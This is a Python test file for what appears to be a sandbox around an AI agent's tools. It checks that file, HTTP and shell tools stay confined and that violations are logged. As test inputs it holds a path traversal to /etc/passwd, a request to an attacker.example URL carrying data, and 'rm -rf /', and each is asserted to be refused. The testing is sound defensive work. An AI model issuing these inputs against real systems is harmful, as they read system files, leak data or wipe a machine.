"""T020: инструменты работают внутри песочницы и отказывают за её пределами."""

from aiuc_mini.sandbox.fs import Sandbox
from aiuc_mini.target.tools import build_tools
from aiuc_mini.trace.events import SandboxViolation, ToolCall, ToolResult
from aiuc_mini.trace.sink import TraceSink
from aiuc_mini.trace.writer import TraceWriter


def _setup(tmp_path, **sb_kwargs):
    sandbox = Sandbox(**sb_kwargs)
    writer = TraceWriter(tmp_path / "run", secret="")
    sink = TraceSink(writer, run_id="r")
    sink.attempt_id = "a"
    tools = {t.name: t for t in build_tools(sandbox, sink)}
    return sandbox, writer, sink, tools


def test_read_write_within_sandbox(tmp_path):
    sandbox, writer, _, tools = _setup(tmp_path, files={"a.txt": "hello"})
    try:
        assert tools["read_file"].invoke({"path": "a.txt"}) == "hello"
        assert tools["write_file"].invoke({"path": "b.txt", "content": "x"}) == "ok"
        assert tools["read_file"].invoke({"path": "b.txt"}) == "x"
    finally:
        writer.close()
        sandbox.cleanup()


def test_read_outside_sandbox_is_refused_and_logged(tmp_path):
    sandbox, writer, _, tools = _setup(tmp_path)
    try:
        out = tools["read_file"].invoke({"path": "../../etc/passwd"})
        assert "ERROR" in out
        events = [type(e).__name__ for e in _read(writer)]
        assert "SandboxViolation" in events
    finally:
        writer.close()
        sandbox.cleanup()


def test_http_get_fixture_vs_external(tmp_path):
    sandbox, writer, _, tools = _setup(
        tmp_path, http_fixtures={"https://ok.example": "BODY"}
    )
    try:
        assert tools["http_get"].invoke({"url": "https://ok.example"}) == "BODY"
        out = tools["http_get"].invoke({"url": "https://attacker.example/?d=x"})
        assert "ERROR" in out
    finally:
        writer.close()
        sandbox.cleanup()


def test_run_command_dangerous_is_refused(tmp_path):
    sandbox, writer, _, tools = _setup(tmp_path)
    try:
        out = tools["run_command"].invoke({"command": "rm -rf /"})
        assert "ERROR" in out
    finally:
        writer.close()
        sandbox.cleanup()


def test_tool_call_logged_before_result(tmp_path):
    sandbox, writer, _, tools = _setup(tmp_path, files={"a.txt": "hi"})
    try:
        tools["read_file"].invoke({"path": "a.txt"})
        events = _read(writer)
        types = [type(e).__name__ for e in events]
        assert types.index("ToolCall") < types.index("ToolResult")
    finally:
        writer.close()
        sandbox.cleanup()


def _read(writer):
    from aiuc_mini.trace.writer import read_trace

    return read_trace(writer.path)
